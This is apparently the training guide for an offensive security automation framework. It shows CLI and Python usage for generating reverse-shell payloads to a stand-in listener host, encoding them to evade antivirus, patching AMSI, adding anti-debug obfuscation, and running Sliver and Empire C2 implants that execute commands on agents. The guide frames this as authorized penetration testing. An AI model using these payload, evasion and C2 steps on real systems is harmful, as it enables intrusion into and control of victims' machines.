# KaliAgent v3 - Training Guide

**Version:** 3.0.0  
**Last Updated:** April 21, 2026  

---

## Table of Contents

1. [Introduction](#introduction)
2. [Getting Started](#getting-started)
3. [Core Modules](#core-modules)
4. [Weaponization](#weaponization)
5. [C2 Infrastructure](#c2-infrastructure)
6. [Production Operations](#production-operations)
7. [Best Practices](#best-practices)
8. [Troubleshooting](#troubleshooting)

---

## Introduction

### What is KaliAgent v3?

KaliAgent v3 is a comprehensive security automation framework that provides:

- **Tool Management** - Search, install, and manage 600+ Kali tools
- **Hardware Integration** - WiFi and SDR device detection
- **Payload Generation** - Create, encode, and test payloads
- **C2 Management** - Multi-framework command and control
- **Production Monitoring** - Resource monitoring and security auditing

### Who Should Use This?

- **Penetration Testers** - Automate reconnaissance and exploitation
- **Red Teamers** - Manage C2 infrastructure at scale
- **Security Researchers** - Test evasion techniques
- **DevSecOps** - Integrate security testing into CI/CD

### Prerequisites

- Kali Linux 2024.x or later
- Python 3.10+
- Root/sudo access for some operations
- Isolated lab environment

---

## Getting Started

### Installation

```bash
# Navigate to project directory
cd /home/user/agentic-ai/agentic_ai

# Verify Python version
python3 --version  # Should be 3.10+

# Check dependencies
pip3 list | grep -E 'requests|grpc'

# Run KaliAgent
python3 -m kali_agent_v3 --help
```

### First Steps

#### 1. Check Hardware

```bash
python3 -m kali_agent_v3.core.hardware_manager --status
```

Expected output:
```
============================================================
HARDWARE STATUS
============================================================
📶 WiFi Adapters: 1
  Interface: wlp2s0
  Chipset: Intel
  Monitor Mode: ✅ Yes
  Packet Injection: ✅ Yes

📻 SDR Devices: 0
🎯 Injection Ready: ✅ Yes
📻 SDR Ready: ❌ No
============================================================
```

#### 2. Search for Tools

```bash
python3 -m kali_agent_v3.core.tool_manager --search nmap
```

#### 3. Install a Tool

```bash
python3 -m kali_agent_v3.core.tool_manager --install nmap
```

#### 4. Verify Installation

```bash
nmap --version
```

---

## Core Modules

### Tool Manager

**Purpose:** Manage Kali Linux tools

**Key Commands:**
```bash
# Search by name
python3 -m kali_agent_v3.core.tool_manager --search nmap

# Search by category
python3 -m kali_agent_v3.core.tool_manager --category information-gathering

# List installed tools
python3 -m kali_agent_v3.core.tool_manager --list-installed

# Install tool
python3 -m kali_agent_v3.core.tool_manager --install wireshark

# Remove tool
python3 -m kali_agent_v3.core.tool_manager --remove wireshark
```

**Python API:**
```python
from core.tool_manager import ToolManager

manager = ToolManager()

# Search
tools = manager.search_tools('nmap')
for tool in tools:
    print(f"{tool.name}: {tool.description}")

# Install
success = manager.install_tool('nmap')
if success:
    print("✅ nmap installed")

# Get info
tool = manager.get_tool('nmap')
print(f"Package: {tool.package}")
print(f"Size: {tool.size_mb} MB")
```

### Hardware Manager

**Purpose:** Detect and configure hardware

**Key Commands:**
```bash
# Show status
python3 -m kali_agent_v3.core.hardware_manager --status

# Detect WiFi
python3 -m kali_agent_v3.core.hardware_manager --detect-wifi

# Enable monitor mode
python3 -m kali_agent_v3.core.hardware_manager --monitor wlan0

# Test injection
python3 -m kali_agent_v3.core.hardware_manager --test-injection wlan0mon

# Detect SDR
python3 -m kali_agent_v3.core.hardware_manager --detect-sdr
```

**Python API:**
```python
from core.hardware_manager import HardwareManager

hw = HardwareManager()

# Detect adapters
adapters = hw.detect_wifi_adapters()
for adapter in adapters:
    print(f"{adapter.interface}: {adapter.chipset}")
    
    # Enable monitor mode
    if adapter.monitor_capable:
        success, monitor_iface = hw.enable_monitor_mode(adapter.interface)
        print(f"Monitor mode: {monitor_iface}")

# Test injection
if adapter.monitor_mode:
    working, rate = hw.test_packet_injection(adapter.monitor_interface)
    print(f"Injection: {rate}% success")
```

### Authorization System

**Purpose:** Safety gates for dangerous operations

**Authorization Levels:**
- **NONE** - Informational only (tool search, hardware status)
- **BASIC** - Low-risk scanning (nmap, nikto)
- **ADVANCED** - Medium-risk (SQL injection, password cracking) - Requires PIN
- **CRITICAL** - High-risk (kernel exploits, rootkits) - Requires PIN + written confirmation

**Key Commands:**
```bash
# Check authorization
python3 -m kali_agent_v3.core.authorization --check nmap_scan

# Request authorization (BASIC)
python3 -m kali_agent_v3.core.authorization --authorize nmap_scan --reason "Network scan"

# Request authorization (ADVANCED)
python3 -m kali_agent_v3.core.authorization --authorize sql_injection --pin 1234 --reason "Web app test"

# Request authorization (CRITICAL)
python3 -m kali_agent_v3.core.authorization --authorize kernel_exploit --pin 1234 --confirm kernel_exploit --reason "Research"

# Show status
python3 -m kali_agent_v3.core.authorization --status

# View audit log
python3 -m kali_agent_v3.core.authorization --audit
```

**Python API:**
```python
from core.authorization import AuthorizationManager, AuthorizationLevel

auth = AuthorizationManager()

# Check if authorized
authorized, reason = auth.check_authorization('sql_injection')
if not authorized:
    print(f"Authorization required: {reason}")
    
    # Request authorization
    success, message, token = auth.request_authorization(
        'sql_injection',
        pin='1234',
        reason='Penetration testing'
    )
    
    if success:
        print(f"✅ Authorized: {token.token_id}")
```

---

## Weaponization

### Payload Generation

**Purpose:** Generate malicious payloads

**Key Commands:**
```bash
# Generate Windows reverse TCP
python3 -m kali_agent_v3.weaponization.payload_generator \
  --lhost 192.0.2.100 \
  --lport 4444 \
  --type reverse_tcp \
  --format exe \
  --platform windows

# Generate Linux reverse HTTPS
python3 -m kali_agent_v3.weaponization.payload_generator \
  --lhost 192.0.2.100 \
  --lport 443 \
  --type reverse_https \
  --format elf \
  --platform linux

# Generate multi-platform
python3 -m kali_agent_v3.weaponization.payload_generator \
  --lhost 192.0.2.100 \
  --lport 4444 \
  --multi
```

**Python API:**
```python
from weaponization.payload_generator import PayloadGenerator, PayloadConfig, Platform, PayloadType

gen = PayloadGenerator()

config = PayloadConfig(
    name='reverse_tcp',
    payload_type=PayloadType.REVERSE_TCP,
    format=PayloadFormat.EXE,
    architecture=Architecture.X64,
    platform=Platform.WINDOWS,
    lhost='192.0.2.100',
    lport=4444
)

result = gen.generate(config)
if result.success:
    print(f"✅ Payload: {result.payload_path}")
    print(f"Size: {result.size_bytes} bytes")
    print(f"MD5: {result.hash_md5}")
```

### Encoding & Evasion

**Purpose:** Evade AV detection

**Key Commands:**
```bash
# Encode with XOR
python3 -m kali_agent_v3.weaponization.encoder \
  --encode payload.exe \
  --encoder xor_dynamic

# Encode with Base64 (multiple iterations)
python3 -m kali_agent_v3.weaponization.encoder \
  --encode payload.exe \
  --encoder base64 \
  --iterations 3

# Patch AMSI (PowerShell)
python3 -m kali_agent_v3.weaponization.encoder \
  --amsi script.ps1

# Add obfuscation
python3 -m kali_agent_v3.weaponization.encoder \
  --obfuscate payload.ps1
```

**Python API:**
```python
from weaponization.encoder import PayloadEncoder, EncoderType, ObfuscationTechnique

enc = PayloadEncoder()

# Encode
result = enc.encode(
    input_path=Path('payload.exe'),
    encoder=EncoderType.XOR_DYNAMIC,
    iterations=3
)

# AMSI patch
success, msg = enc.patch_amsi(Path('script.ps1'))

# Obfuscation
techniques = [
    ObfuscationTechnique.STRING_ENCRYPTION,
    ObfuscationTechnique.DEAD_CODE,
    ObfuscationTechnique.ANTI_DEBUG
]
success, msg = enc.add_obfuscation(Path('payload.ps1'), techniques)
```

### Testing Framework

**Purpose:** Validate payloads

**Key Commands:**
```bash
# Run all tests
python3 -m kali_agent_v3.weaponization.testing_framework \
  --test payload.exe

# Run specific tests
python3 -m kali_agent_v3.weaponization.testing_framework \
  --test payload.exe \
  --tests size_check signature_check av_evasion

# View history
python3 -m kali_agent_v3.weaponization.testing_framework --history
```

**Python API:**
```python
from weaponization.testing_framework import PayloadTester, TestType

tester = PayloadTester()

# Run tests
report = tester.test_payload(Path('payload.exe'))

print(f"Status: {report.overall_status}")
print(f"Passed: {report.passed}/{report.total_tests}")
print(f"Risk Score: {report.risk_score:.1f}/10")

for result in report.test_results:
    icon = "✅" if result.success else "❌"
    print(f"{icon} {result.test_type.value}: {result.message}")
```

### Weaponization Engine

**Purpose:** End-to-end payload generation

**Key Commands:**
```bash
# Quick weaponize
python3 -m kali_agent_v3.weaponization.weaponization_engine \
  --quick \
  --name my_payload \
  --lhost 192.0.2.100 \
  --lport 4444 \
  --platform windows

# View statistics
python3 -m kali_agent_v3.weaponization.weaponization_engine --stats

# List jobs
python3 -m kali_agent_v3.weaponization.weaponization_engine --list-jobs
```

**Python API:**
```python
from weaponization.weaponization_engine import WeaponizationEngine
from payload_generator import Platform

engine = WeaponizationEngine()

# Quick weaponize
report = engine.quick_weaponize(
    name='my_payload',
    lhost='192.0.2.100',
    lport=4444,
    platform=Platform.WINDOWS
)

if report.success:
    print(f"✅ Payload ready: {report.final_payload_path}")
    print(f"Stages: {', '.join(report.stages_completed)}")
    print(f"Time: {report.total_time_seconds:.1f}s")
```

---

## C2 Infrastructure

### Sliver C2

**Purpose:** Manage Sliver C2 server

**Key Commands:**
```bash
# Connect to Sliver
python3 -m kali_agent_v3.c2.sliver_client \
  --connect grpc://localhost:31337

# Generate implant
python3 -m kali_agent_v3.c2.sliver_client \
  --generate reverse_https \
  --lhost 192.0.2.100 \
  --lport 443

# Generate beacon
python3 -m kali_agent_v3.c2.sliver_client \
  --beacon beacon_1 \
  --lhost 192.0.2.100 \
  --lport 443

# List implants
python3 -m kali_agent_v3.c2.sliver_client --list-implants

# Start listener
python3 -m kali_agent_v3.c2.sliver_client \
  --start-listener https_listener \
  --lhost 0.0.0.0 \
  --lport 443
```

### Empire C2

**Purpose:** Manage Empire C2 server

**Key Commands:**
```bash
# Connect to Empire
python3 -m kali_agent_v3.c2.empire_client \
  --connect https://localhost:1337 \
  --username empireadmin \
  --password password123

# Create listener
python3 -m kali_agent_v3.c2.empire_client \
  --create-listener http_main \
  --listener-type http \
  --host 0.0.0.0 \
  --port 8080

# Generate stager
python3 -m kali_agent_v3.c2.empire_client \
  --generate-stager launcher \
  --stager-type powershell

# List agents
python3 -m kali_agent_v3.c2.empire_client --list-agents

# List modules
python3 -m kali_agent_v3.c2.empire_client --list-modules
```

### C2 Orchestration

**Purpose:** Multi-C2 management

**Key Commands:**
```bash
# Add C2 server
python3 -m kali_agent_v3.c2.orchestration \
  --add-server sliver_1 \
  --framework sliver \
  --host 192.0.2.100 \
  --port 31337

# Connect to server
python3 -m kali_agent_v3.c2.orchestration \
  --connect sliver_1

# Sync agents
python3 -m kali_agent_v3.c2.orchestration --sync-agents

# List agents
python3 -m kali_agent_v3.c2.orchestration --list-agents

# Execute command
python3 -m kali_agent_v3.c2.orchestration \
  --execute whoami \
  --agent-id agent_123

# Health check
python3 -m kali_agent_v3.c2.orchestration --health-check

# Statistics
python3 -m kali_agent_v3.c2.orchestration --stats
```

---

## Production Operations

### System Monitoring

**Purpose:** Monitor system resources

**Key Commands:**
```bash
# Show status
python3 -m kali_agent_v3.production.monitoring --status

# View alerts
python3 -m kali_agent_v3.production.monitoring --alerts

# Acknowledge alert
python3 -m kali_agent_v3.production.monitoring \
  --acknowledge alert_1_20260421120000

# Export report
python3 -m kali_agent_v3.production.monitoring --export

# Set thresholds
python3 -m kali_agent_v3.production.monitoring \
  --set-threshold cpu:70:90
```

**Python API:**
```python
from production.monitoring import SystemMonitor

monitor = SystemMonitor()

# Get health
health = monitor.get_health_status()
print(f"Status: {health.status}")
print(f"CPU: {health.cpu_usage:.1f}%")
print(f"Memory: {health.memory_usage:.1f}%")

# Get alerts
alerts = monitor.get_alerts(unacknowledged_only=True)
for alert in alerts:
    print(f"[{alert.level.value}] {alert.message}")
```

### Security Auditing

**Purpose:** Security hardening and compliance

**Key Commands:**
```bash
# Run security scan
python3 -m kali_agent_v3.production.security_audit --scan

# Show findings
python3 -m kali_agent_v3.production.security_audit --findings

# Show security score
python3 -m kali_agent_v3.production.security_audit --score

# Acknowledge finding
python3 -m kali_agent_v3.production.security_audit \
  --acknowledge finding_1_20260421120000

# Export audit log
python3 -m kali_agent_v3.production.security_audit --export-audit
```

**Python API:**
```python
from production.security_audit import SecurityAuditor

auditor = SecurityAuditor()

# Run scan
findings = auditor.run_security_checks()

# Get score
score = auditor.get_security_score()
print(f"Score: {score['score']}/100 (Grade: {score['grade']})")

# Log action
auditor.log_action(
    user='admin',
    action='execute_command',
    resource='agent_123',
    result='success'
)
```

---

## Best Practices

### 1. Authorization

- Always use authorization gates for dangerous operations
- Set strong PINs for ADVANCED/CRITICAL actions
- Review audit logs regularly
- Acknowledge findings after remediation

### 2. Payload Testing

- Always test payloads before deployment
- Use multiple encoding layers for evasion
- Check AV signatures before deployment
- Test in isolated environment first

### 3. C2 Management

- Use multiple C2 servers for redundancy
- Enable health checks
- Monitor agent connections
- Rotate C2 infrastructure regularly

### 4. Security

- Run regular security scans
- Patch systems promptly
- Monitor resource usage
- Keep audit logs for compliance

### 5. Documentation

- Document all penetration testing activities
- Keep records of authorizations
- Save scan results and reports
- Maintain chain of custody for evidence

---

## Troubleshooting

### Common Issues

#### "msfvenom not found"

**Solution:**
```bash
sudo apt update
sudo apt install metasploit-framework
```

#### "grpc not available"

**Solution:**
```bash
pip3 install grpcio grpcio-tools
```

#### "psutil not available"

**Solution:**
```bash
pip3 install psutil
```

#### "Permission denied"

**Solution:**
```bash
# Run with sudo for hardware operations
sudo python3 -m kali_agent_v3.core.hardware_manager --status

# Or add user to required groups
sudo usermod -aG netdev,wifi $USER
```

#### "Connection refused"

**Solution:**
- Verify C2 server is running
- Check firewall rules
- Verify correct port and host

---

## Next Steps

1. **Practice in Lab Environment** - Set up isolated lab for testing
2. **Complete Training Scenarios** - Follow example workflows
3. **Read Advanced Documentation** - Study API reference
4. **Join Community** - Engage with security community

---

*Happy (ethical) hacking! 🍀*
